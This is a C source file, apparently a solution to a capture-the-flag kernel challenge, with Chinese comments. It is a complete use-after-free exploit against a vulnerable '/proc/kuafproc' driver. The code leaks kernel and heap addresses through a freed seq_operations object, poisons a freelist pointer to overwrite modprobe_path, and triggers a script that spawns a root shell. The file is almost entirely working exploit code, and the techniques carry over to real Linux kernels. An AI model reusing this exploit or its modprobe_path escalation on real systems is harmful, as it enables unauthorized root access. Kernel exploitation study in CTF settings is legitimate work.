//gcc -masm=intel -static exploit.c -o exploit
//home/heap/uaf/modprobe_path/exploit

#define _GNU_SOURCE
#include "mykernelpwn.h"

#define single_start 0xffffffff812cba30
#define modprobe_path 0xffffffff8265b260

#define ROOT_SCRIPT_PATH  "/home/shellexecv"
// char root_cmd[] = "#!/bin/sh\nchmod 777 /flag";
char root_cmd[] = "#!/bin/sh\nsetsid cttyhack setuidgid 0 sh";

struct kuaf_note {
    size_t idx;
    size_t size;
    char* buf;
};

struct note_data {
    size_t size;
    char* data;
};

int kuaf_fd;

void kuaf_add(size_t idx, size_t size, char* buf)
{
    struct kuaf_note note = {
        .idx = idx,
        .size = size,
        .buf = buf,
    };
    ioctl(kuaf_fd, 0x112233, &note);
}


void kuaf_edit(size_t idx, char* buf)
{
    struct kuaf_note note = {
        .idx = idx,
        .buf = buf,
    };
    ioctl(kuaf_fd, 0x223344, &note);
}

// kfree(&notebook[idx]->data)
void kuaf_del(size_t idx)
{
    struct kuaf_note note = {
        .idx = idx,
    };
    ioctl(kuaf_fd, 0x334455, &note);
}

// void kuaf_gift(void* buf)
// {
//     struct kuaf_note note = {
//         .buf = buf,
//     };
//     ioctl(kuaf_fd, 0x445566, &note);
// }

// 把 notebook[idx]->data 数据读到 buf
ssize_t kuaf_read(int idx, void* buf)
{
    return read(kuaf_fd, buf, idx);
}


int main(int argc, char** argv, char** envp)
{

    size_t buf[0x100], flag[0x100], index, kernel_heap_leak, page_offset_base;
    long   seq_fd;
    int idx = 0, root_script_fd, flag_fd;

    save_status();
    bind_core(0);

    memset(flag, 0, sizeof(flag));

    // 打开 proc
    kuaf_fd = open("/proc/kuafproc", O_RDWR);
    if (kuaf_fd < 0) {
        err_exit("Failed to open /proc/kuafproc!");
    }

    // 创建 fake modprobe_path 文件
    root_script_fd = open(ROOT_SCRIPT_PATH, O_RDWR | O_CREAT);
    write(root_script_fd, root_cmd, sizeof(root_cmd));
    close(root_script_fd);
    system("chmod +x " ROOT_SCRIPT_PATH);

    // 获得一个 seq_operations object
    note_info("Allocating seq_operations-size object...");
    for(int i = 0; i < 0xf; i++){
        kuaf_add(i, 0x20, buf);
    }
    for(int i = 0; i < 0xf; i++){
        kuaf_del(i);
    }

    // 定位 seq_operations
    seq_fd = open("/proc/self/stat", O_RDONLY);
    for(int i = 0; i < 0xf; i++){
        kuaf_read(i, buf);
        if(buf[0] > 0xffffffff00000000){
            index = i;
            break;
        }
    }
    printf("\033[32m\033[1m[+] Index: %ld\033[0m\n", index);
    
    print_binary(buf, 0x20);
    kernel_offset = buf[0] - single_start;
    kernel_base += kernel_offset;
    printf("\033[32m\033[1m[+] Kernel offset: %p\033[0m\n", kernel_offset);
    printf("\033[32m\033[1m[+] Kernel base: %p\033[0m\n", kernel_base);

    kuaf_add(0x10, 0x30, buf);
    kuaf_del(0x10);

    // 得到内核堆地址和偏移
    kuaf_read(0x10, buf);
    print_binary(buf, 0x30);
    kernel_heap_leak = buf[0];
    page_offset_base = kernel_heap_leak & 0xfffffffff0000000;
    printf("\033[32m\033[1m[+] kernel heap leak: %p\033[0m\n", kernel_heap_leak);
    printf("\033[32m\033[1m[+] page_offset_base: %p\033[0m\n", page_offset_base);

    // 修改内核堆指针，指向目标地址-0x10处
    buf[0] = modprobe_path + kernel_offset - 0x10;
    kuaf_edit(0x10, buf);

    // 使用 chunk0x10
    kuaf_add(0x11, 0x30, buf);

    strcpy((char *) &buf[2], ROOT_SCRIPT_PATH);
    // 分配到 modprobe_path - 0x10 处，并修改 modprobe_path 值
    kuaf_add(0x12, 0x30, buf);

    // trigger the fake modprobe_path
    note_info("Trigerring fake modprobe_path...");
    system("echo -e '\\xff\\xff\\xff\\xff' > /home/fake");
    system("chmod +x /home/fake");
    // getshell 成功提权
    system("/home/fake");

    // // read flag
    // flag_fd = open("/flag", O_RDWR);
    // if (flag_fd < 0) {
    //     err_exit("Failed to chmod flag!");
    // }
    // read(flag_fd, flag, sizeof(flag));
    // printf("\033[32m\033[1m[+] Got flag: %s\033[0m\n", flag);

    return 0;
}